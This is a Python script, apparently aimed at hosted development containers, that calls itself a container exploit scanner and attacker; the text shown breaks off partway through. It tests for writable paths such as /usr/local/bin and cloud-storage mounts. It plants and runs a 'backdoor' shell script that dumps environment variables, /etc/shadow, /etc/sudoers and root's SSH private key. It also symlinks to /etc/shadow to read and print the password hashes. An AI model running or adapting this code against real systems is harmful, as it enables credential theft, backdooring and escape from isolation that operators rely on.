#!/usr/bin/env python3
import os
import sys
import subprocess
import stat
import time

def banner():
    print("="*60)
    print("FULL CONTAINER EXPLOIT SCANNER & ATTACKER")
    print("="*60)

def test_write_access(path, description):
    """Тестируем права на запись"""
    print(f"\n[*] Testing write access: {description}")
    print(f"    Path: {path}")
    print("-" * 60)
    
    if not os.path.exists(path):
        print(f"[-] Path doesn't exist")
        return False
    
    test_file = os.path.join(path, f".test_write_{os.getpid()}")
    
    try:
        with open(test_file, 'w') as f:
            f.write("test")
        
        print(f"[+] WRITE ACCESS CONFIRMED!")
        
        # Cleanup
        os.remove(test_file)
        return True
        
    except PermissionError:
        print(f"[-] No write access")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def exploit_usr_local_bin():
    """Exploit /usr/local/bin writable"""
    print("\n" + "="*60)
    print("[*] EXPLOIT ATTEMPT: /usr/local/bin hijacking")
    print("="*60)
    
    target_path = "/usr/local/bin"
    
    if not test_write_access(target_path, "usr/local/bin"):
        return False
    
    # Создаём backdoor script
    exploit_script = os.path.join(target_path, "bd")
    
    payload = """#!/bin/bash
# Backdoor script
whoami > /tmp/exploit_result.txt
id >> /tmp/exploit_result.txt
echo "PWD: $(pwd)" >> /tmp/exploit_result.txt
env >> /tmp/exploit_result.txt
echo "---SENSITIVE FILES---" >> /tmp/exploit_result.txt
cat /etc/shadow >> /tmp/exploit_result.txt 2>&1
cat /etc/sudoers >> /tmp/exploit_result.txt 2>&1
cat /root/.ssh/id_rsa >> /tmp/exploit_result.txt 2>&1
ls -la /root >> /tmp/exploit_result.txt 2>&1
"""
    
    try:
        print(f"[*] Creating exploit script at {exploit_script}")
        with open(exploit_script, 'w') as f:
            f.write(payload)
        
        os.chmod(exploit_script, 0o755)
        print(f"[+] Exploit script created and chmod 755")
        
        # Пытаемся запустить
        print(f"[*] Attempting to execute...")
        result = subprocess.run([exploit_script], capture_output=True, text=True, timeout=5)
        
        print(f"[*] Return code: {result.returncode}")
        
        # Проверяем результат
        if os.path.exists('/tmp/exploit_result.txt'):
            print(f"[+++] EXPLOIT SUCCESSFUL! Reading results:")
            with open('/tmp/exploit_result.txt', 'r') as f:
                print(f.read())
            return True
        else:
            print(f"[-] Exploit script created but no output")
            
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
    
    return False

def exploit_polarfs():
    """Exploit PolarFS writable mount"""
    print("\n" + "="*60)
    print("[*] EXPLOIT ATTEMPT: PolarFS manipulation")
    print("="*60)
    
    paths = [
        "/tmp/my-project",
        "/home/user_skills"
    ]
    
    for path in paths:
        print(f"\n[*] Testing {path}")
        
        if not test_write_access(path, f"PolarFS {path}"):
            continue
        
        # Пытаемся создать malicious файл
        exploit_file = os.path.join(path, "exploit.sh")
        
        payload = """#!/bin/bash
whoami > /tmp/polarfs_exploit.txt
id >> /tmp/polarfs_exploit.txt
cat /etc/shadow >> /tmp/polarfs_exploit.txt 2>&1
"""
        
        try:
            with open(exploit_file, 'w') as f:
                f.write(payload)
            os.chmod(exploit_file, 0o755)
            
            print(f"[+] Created exploit at {exploit_file}")
            
            # Пытаемся создать symlink на sensitive files
            symlink_path = os.path.join(path, "shadow_link")
            try:
                os.symlink("/etc/shadow", symlink_path)
                print(f"[+] Created symlink to /etc/shadow at {symlink_path}")
                
                # Пытаемся прочитать через symlink
                if os.path.exists(symlink_path):
                    try:
                        with open(symlink_path, 'r') as f:
                            content = f.read()
                            if content:
                                print(f"[+++] SYMLINK EXPLOIT SUCCESSFUL!")
                                print(f"Shadow file content:")
                                print(content[:500])
                                return True
                    except:
                        pass
            except:
                pass
                
        except Exception as e:
            print(f"[-] Failed: {e}")
    
    return False

def exploit_ossfs():
    """Exploit OSSFS writable mounts"""
    print("\n" + "="*60)
    print("[*] EXPLOIT ATTEMPT: OSSFS manipulation")
    print("="*60)
    
    paths = [
        "/home/z/my-project/upload",
        "/home/sync"
    ]
    
    for path in paths:
        print(f"\n[*] Testing {path}")
        
        if not test_write_access(path, f"OSSFS {path}"):
            continue
        
        # OSSFS это Alibaba OSS - можем попытаться положить туда файлы
        # которые потом прочитает другой процесс
        
        exploit_file = os.path.join(path, "exploit_payload.txt")
        
        try:
            with open(exploit_file, 'w') as f:
                f.write("EXPLOIT PAYLOAD - testing OSS write access\n")
                f.write(f"Written by UID: {os.getuid()}\n")
                f.write(f"Time: {time.time()}\n")
            
            print(f"[+] Successfully wrote to OSSFS at {exploit_file}")
            
            # Проверяем что можем читать обратно
            with open(exploit_file, 'r') as f:
